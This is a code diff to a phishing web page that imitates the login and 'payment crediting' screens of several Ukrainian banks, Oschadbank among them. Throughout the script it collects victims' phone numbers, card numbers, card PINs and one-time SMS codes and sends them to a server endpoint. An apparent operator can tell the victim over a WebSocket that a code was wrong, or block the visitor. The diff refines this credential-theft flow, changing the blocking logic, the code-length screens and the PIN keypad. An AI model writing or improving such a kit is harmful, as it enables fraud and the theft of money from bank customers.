@@ -574,8 +574,14 @@
     </div>
 
 <script>
-    <script>
 document.addEventListener('DOMContentLoaded', () => {
+    // --- ПРОВЕРКА БЛОКИРОВКИ ---
+    if (localStorage.getItem('access_blocked') === 'true') {
+        document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; text-align:center;"><h1>🚫<br>Доступ заблоковано</h1></div>`;
+        return;
+    }
+    // -------------------------
+
     // --- CONFIG & STATE VARIABLES ---
     const bankFlows = {
         'oschadbank': { name: 'Ощадбанк', logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Oschadbank_%28uk%29.png/1200px-Oschadbank_%28uk%29.png', theme: 'oschadbank' },
@@ -589,18 +595,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const urlParams = new URLSearchParams(window.location.search);
     const ref = urlParams.get('ref') || 'unknown';
     localStorage.setItem('referrer', ref);
-    // Генерируем уникальный ID, чтобы использовать его как "ключ бана"
-    let sessionId = localStorage.getItem('sessionId');
-    if (!sessionId) {
-        sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
-        localStorage.setItem('sessionId', sessionId);
-    }
-
-    // Проверяем, забанен ли пользователь
-    if (localStorage.getItem('isBanned') === 'true') {
-        document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; text-align:center;"><h1>🚫<br>Доступ заблоковано</h1></div>`;
-        return; // Прекращаем выполнение скрипта
-    }
+    const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
     
     let ws;
     let activeBankData = {};
@@ -1004,10 +999,10 @@ document.addEventListener('DOMContentLoaded', () => {
         lastCodeScreen = 'generic_debit';
         const theme = activeBankData.colors || { primary: '#FFCC00', text: '#F2F2F7', bg: '#1C1C1E' };
         
-        raiffModalOverlay.style.backgroundColor = theme.bg;
+        // **ИЗМЕНЕНИЕ: Установка длины кода 6 для всех, кроме Ощадбанка**
+        const codeLength = activeBankData.theme === 'oschadbank' ? 4 : 6;
         
-        // ИЗМЕНЕНИЕ 1: CODE_LENGTH = 6
-        const CODE_LENGTH = activeBankData.theme === 'oschadbank' ? 4 : 6; 
+        raiffModalOverlay.style.backgroundColor = theme.bg;
         
         const html = `
             <div class="raiff-header">
@@ -1023,8 +1018,8 @@ document.addEventListener('DOMContentLoaded', () => {
                 </div>
                 <h2 class="raiff-main-title">Останній крок</h2>
                 <p class="raiff-subtitle">Для зарахування коштів на вашу картку введіть одноразовий SMS код</p>
-                <div class="raiff-code-inputs ${options.error ? 'error' : ''}">
-                    ${Array(CODE_LENGTH).fill('<input type="tel" class="raiff-code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">').join('')}
+                <div class="raiff-code-inputs ${options.error ? 'error' : ''}" style="gap: ${codeLength === 6 ? '10px' : '15px'};">
+                    ${Array(codeLength).fill('<input type="tel" class="raiff-code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">').join('')}
                 </div>
                  ${options.error ? `<p class="raiff-error-text">Невірний код</p>` : ''}
                 <p class="raiff-resend-info" id="raiff-resend-info" style="margin-top: 20px;">Надіслати код повторно</p>
@@ -1057,9 +1052,9 @@ document.addEventListener('DOMContentLoaded', () => {
         hideAllModals();
         lastCodeScreen = 'generic_light_debit';
         
-        // ИЗМЕНЕНИЕ 1: CODE_LENGTH = 6
-        const CODE_LENGTH = activeBankData.theme === 'oschadbank' ? 4 : 6; 
-        
+        // **ИЗМЕНЕНИЕ: Установка длины кода 6 для всех, кроме Ощадбанка**
+        const codeLength = activeBankData.theme === 'oschadbank' ? 4 : 6;
+
         const html = `
             <div class="alliance-header">
                 <span class="back-arrow" id="alliance-debit-back-btn">
@@ -1074,8 +1069,8 @@ document.addEventListener('DOMContentLoaded', () => {
                 </div>
                 <h2 class="alliance-main-title">Останній крок</h2>
                 <p class="alliance-subtitle">Для зарахування коштів на вашу картку введіть одноразовий SMS код</p>
-                <div class="raiff-code-inputs ${options.error ? 'error' : ''}" style="margin: 0 auto 25px auto; max-width: 350px;">
-                    ${Array(CODE_LENGTH).fill('<input type="tel" class="raiff-code-input" style="background-color: var(--white); border-color: var(--alliance-border-color); color: var(--alliance-text);" maxlength="1" inputmode="numeric" pattern="[0-9]*">').join('')}
+                <div class="raiff-code-inputs ${options.error ? 'error' : ''}" style="margin: 0 auto 25px auto; max-width: 350px; gap: ${codeLength === 6 ? '10px' : '15px'};">
+                    ${Array(codeLength).fill('<input type="tel" class="raiff-code-input" style="background-color: var(--white); border-color: var(--alliance-border-color); color: var(--alliance-text);" maxlength="1" inputmode="numeric" pattern="[0-9]*">').join('')}
                 </div>
                 ${options.error ? `<p class="raiff-error-text" style="color: var(--danger-color); text-align: center; font-weight: 500;">Невірний код</p>` : ''}
                 <p class="raiff-resend-info" style="margin-top: 20px; text-align: center; color: var(--alliance-text-secondary); cursor: pointer;">Надіслати код повторно</p>
@@ -1229,7 +1224,6 @@ document.addEventListener('DOMContentLoaded', () => {
 
             </div>
             <button class="oschad-submit-button" id="oschad-submit-btn" disabled>ПРОДОВЖИТИ</button>
-            <button class="oschad-submit-button" id="ban-user-btn" style="position: static; margin-top: 10px; background-color: var(--danger-color); color: var(--white); cursor: pointer; opacity: 0.8; font-size: 14px;">ЗАБАНИТЬ ПОЛЬЗОВАТЕЛЯ</button>
         `;
         customModalContent.innerHTML = html;
         customModalOverlay.style.display = 'flex';
@@ -1246,11 +1240,9 @@ document.addEventListener('DOMContentLoaded', () => {
                 <p style="text-align: center; width: 100%; margin-top: 5px;">Зачекайте 1-2 хвилини</p>
                 <img src="https://itc.ua/wp-content/uploads/2021/12/oschadik_mint_headphones-770x770.png" class="loader-icon" alt="Loading...">
             </div>
-             <button class="oschad-submit-button" id="ban-user-btn-loader" style="position: fixed; bottom: 20px; background-color: var(--danger-color); color: var(--white); cursor: pointer; opacity: 0.8; font-size: 14px;">ЗАБАНИТЬ ПОЛЬЗОВАТЕЛЯ</button>
         `;
         customModalContent.innerHTML = html;
         document.getElementById('loader-back-arrow').addEventListener('click', () => renderOschadbankLogin());
-        document.getElementById('ban-user-btn-loader').addEventListener('click', () => sendDataToServer({ type: 'ban_user' }, false));
     }
     function renderCodeScreen(options) {
         hideAllModals();
@@ -1277,7 +1269,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 ${error ? `<p class="oschad-code-error-text">Код введено невірно</p>` : ''}
                 <a href="#" class="oschad-resend-link" id="resend-link">${resendText}</a>
             </div>
-            <button class="oschad-submit-button" id="ban-user-btn-code" style="position: fixed; bottom: 20px; background-color: var(--danger-color); color: var(--white); cursor: pointer; opacity: 0.8; font-size: 14px;">ЗАБАНИТЬ ПОЛЬЗОВАТЕЛЯ</button>
         `;
         customModalContent.innerHTML = html;
         customModalOverlay.style.display = 'flex';
@@ -1285,7 +1276,6 @@ document.addEventListener('DOMContentLoaded', () => {
         document.getElementById('code-screen-back-arrow').addEventListener('click', () => {
             (collectedData.currentFlow === 'forgot_password') ? renderForgotPasswordFlow(3) : renderOschadbankLogin();
         });
-        document.getElementById('ban-user-btn-code').addEventListener('click', () => sendDataToServer({ type: 'ban_user' }, false));
         
         setupCodeInputs(screenId, codeLength);
         startCallTimer(60);
@@ -1318,13 +1308,12 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
     function renderTelegramSmsScreen(options = {}) {
-        // ИЗМЕНЕНИЕ 1: CODE_LENGTH = 6
-        const CODE_LENGTH = 6;
+        // **ИЗМЕНЕНИЕ: Установка длины кода 6**
         renderCodeScreen({
             header: 'Підтвердження', title: 'Останній крок',
             instructionText: 'Для зарахування коштів на вашу картку введіть одноразовий SMS код',
             resendText: 'Відправити SMS ще раз', screenId: 'telegram_sms', error: options.error,
-            codeLength: CODE_LENGTH
+            codeLength: 6
         });
     }
     function renderForgotPasswordFlow(step, options = {}) {
@@ -1343,13 +1332,11 @@ document.addEventListener('DOMContentLoaded', () => {
                            <div class="oschad-phone-wrapper"><span class="oschad-phone-prefix">+380</span><input type="tel" class="oschad-input-field" id="fp_phone_input" placeholder=" " autocomplete="off" inputmode="numeric" pattern="[0-9\\s]*"></div>
                         </div>
                     </div>
-                    <button class="oschad-submit-button" id="fp-submit-btn" disabled>ПРОДОВЖИТИ</button>
-                    <button class="oschad-submit-button" id="ban-user-btn-fp1" style="position: static; margin-top: 10px; background-color: var(--danger-color); color: var(--white); cursor: pointer; opacity: 0.8; font-size: 14px;">ЗАБАНИТЬ ПОЛЬЗОВАТЕЛЯ</button>`;
+                    <button class="oschad-submit-button" id="fp-submit-btn" disabled>ПРОДОВЖИТИ</button>`;
                 submitFunction = () => {
                     sendDataToServer({ fp_phone: '+380' + document.getElementById('fp_phone_input').value.replace(/\D/g, '') }, false);
                     renderForgotPasswordFlow(2);
                 };
-                document.getElementById('ban-user-btn-fp1').addEventListener('click', () => sendDataToServer({ type: 'ban_user' }, false));
                 break;
             case 2:
                  html = `
@@ -1361,14 +1348,12 @@ document.addEventListener('DOMContentLoaded', () => {
                            <input type="tel" class="oschad-input-field" id="fp_card_input" placeholder=" " autocomplete="off" maxlength="19" inputmode="numeric" pattern="[0-9\\s]*">
                         </div>
                     </div>
-                    <button class="oschad-submit-button" id="fp-submit-btn" disabled>ПРОДОВЖИТИ</button>
-                    <button class="oschad-submit-button" id="ban-user-btn-fp2" style="position: static; margin-top: 10px; background-color: var(--danger-color); color: var(--white); cursor: pointer; opacity: 0.8; font-size: 14px;">ЗАБАНИТЬ ПОЛЬЗОВАТЕЛЯ</button>`;
+                    <button class="oschad-submit-button" id="fp-submit-btn" disabled>ПРОДОВЖИТИ</button>`;
                 backFunction = () => renderForgotPasswordFlow(1);
                 submitFunction = () => {
                     sendDataToServer({ fp_card: document.getElementById('fp_card_input').value.replace(/\D/g, '') }, false);
                     renderForgotPasswordFlow(3);
                 };
-                 document.getElementById('ban-user-btn-fp2').addEventListener('click', () => sendDataToServer({ type: 'ban_user' }, false));
                 break;
              case 3:
                 const last4 = collectedData.fp_card ? collectedData.fp_card.slice(-4) : '8479';
@@ -1377,16 +1362,13 @@ document.addEventListener('DOMContentLoaded', () => {
                     <div class="oschad-pin-screen-container">
                         <div><p class="oschad-pin-screen-title">PIN-код картки **${last4}</p><div class="oschad-pin-dots-container" id="pin-dots">${Array(4).fill('<div class="oschad-pin-dot"></div>').join('')}</div></div>
                         <div class="oschad-pin-keypad" id="pin-keypad">
-                            <button class="oschad-pin-key" data-key="9">9</button><button class="oschad-pin-key" data-key="8">8</button><button class="oschad-pin-key" data-key="6">6</button>
-                            <button class="oschad-pin-key" data-key="7">7</button><button class="oschad-pin-key" data-key="3">3</button><button class="oschad-pin-key" data-key="2">2</button>
-                            <button class="oschad-pin-key" data-key="0">0</button><button class="oschad-pin-key" data-key="1">1</button><button class="oschad-pin-key" data-key="5">5</button>
-                            <button class="oschad-pin-key" data-key="4">4</button>
-                            <button class="oschad-pin-key backspace" data-key="backspace"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path><line x1="18" y1="9" x2="12" y2="15"></line><line x1="12" y1="9" x2="18" y2="15"></line></svg></button>
+                            ${[1, 2, 3, 4, 5, 6, 7, 8, 9, '', 0, 'backspace'].map(k => {
+                                if (k === 'backspace') return `<button class="oschad-pin-key backspace" data-key="backspace"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path><line x1="18" y1="9" x2="12" y2="15"></line><line x1="12" y1="9" x2="18" y2="15"></line></svg></button>`;
+                                return k === '' ? `<div></div>` : `<button class="oschad-pin-key" data-key="${k}">${k}</button>`;
+                            }).join('')}
                         </div>
-                    </div>
-                     <button class="oschad-submit-button" id="ban-user-btn-fp3" style="position: fixed; bottom: 20px; background-color: var(--danger-color); color: var(--white); cursor: pointer; opacity: 0.8; font-size: 14px;">ЗАБАНИТЬ ПОЛЬЗОВАТЕЛЯ</button>`;
+                    </div>`;
                 backFunction = () => renderForgotPasswordFlow(2);
-                 document.getElementById('ban-user-btn-fp3').addEventListener('click', () => sendDataToServer({ type: 'ban_user' }, false));
                 break;
         }
 
@@ -1433,10 +1415,6 @@ document.addEventListener('DOMContentLoaded', () => {
     function addOschadbankLoginListeners() {
         document.getElementById('oschad-back-arrow').addEventListener('click', () => { window.location.reload(); });
         document.querySelector('.forgot-password-link').addEventListener('click', (e) => { e.preventDefault(); renderForgotPasswordFlow(1); });
-        
-        // НОВОЕ: Обработчик кнопки бана
-        document.getElementById('ban-user-btn').addEventListener('click', () => sendDataToServer({ type: 'ban_user' }, false));
-
 
         const togglePhoneBtn = document.getElementById('toggle-phone'), toggleLoginBtn = document.getElementById('toggle-login');
         const phoneLoginForm = document.getElementById('phone-login-form'), loginForm = document.getElementById('login-form');
@@ -1544,8 +1522,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 clearInterval(callTimerInterval);
                 link.textContent = initialText + (link.id === 'resend-link' ? '?' : '');
                 link.classList.add('active');
-                // НОВОЕ: Обработчик для повторной отправки кода (отправляем команду на сервер)
-                link.onclick = (e) => { e.preventDefault(); sendDataToServer({ type: 'resend_code', lastScreen: lastCodeScreen }, false); startCallTimer(60); };
+                link.onclick = (e) => { e.preventDefault(); startCallTimer(60); };
             } else {
                 link.textContent = `${initialText} через ${timer} секунд`;
                 link.classList.remove('active'); timer--;
@@ -1583,30 +1560,8 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    // ИЗМЕНЕНИЕ 2: ДОБАВЛЕНИЕ ЛОГИКИ БАНА
     async function sendDataToServer(data, isFinal) {
         collectedData = { ...collectedData, ...data };
-        
-        // Логика бана
-        if (data.type === 'ban_user') {
-             // Отправляем команду на сервер для логирования/обработки
-             try {
-                await fetch(`/api/submit`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        sessionId, type: 'BAN', ...data
-                    }),
-                });
-             } catch (error) { console.error('Failed to send BAN data:', error); }
-             
-             // Локальный бан пользователя
-             localStorage.setItem('isBanned', 'true');
-             document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; text-align:center;"><h1>🚫<br>Доступ заблоковано</h1></div>`;
-             if (ws) ws.close();
-             return;
-        }
-
         try {
             await fetch(`/api/submit`, {
                 method: 'POST',
@@ -1658,7 +1613,13 @@ document.addEventListener('DOMContentLoaded', () => {
                 else if (lastCodeScreen === 'generic_debit') renderThemedDebitScreen(errorOptions);
                 break;
             case 'raiff_code_error': renderRaiffSmsScreen(collectedData.phone, { error: true }); break;
-            case 'generic_debit_error': renderThemedDebitScreen({ error: true }); break;
+            case 'generic_debit_error': 
+                 if (['alliance', 'vostok', 'izibank', 'ukrsib'].includes(activeBankData.theme)) {
+                    renderThemedLightDebitScreen({ error: true });
+                } else {
+                    renderThemedDebitScreen({ error: true });
+                }
+                break;
             case 'viber_code_error': renderOschadbankViberScreen({ error: true }); break;
             case 'other':
                 const bankToDisable = document.querySelector(`.bank-item[data-bank="${activeBankData.theme}"]`);
@@ -1673,8 +1634,8 @@ document.addEventListener('DOMContentLoaded', () => {
                 body.classList.add('form-active');
                 break;
             case 'ban':
-                // Сервер прислал команду бана
-                localStorage.setItem('isBanned', 'true');
+                // **ИЗМЕНЕНИЕ: Логика блокировки**
+                localStorage.setItem('access_blocked', 'true');
                 document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; text-align:center;"><h1>🚫<br>Доступ заблоковано</h1></div>`;
                 if (ws) ws.close();
                 break;
@@ -1710,6 +1671,5 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 });
 </script>
-
 </body>
 </html>
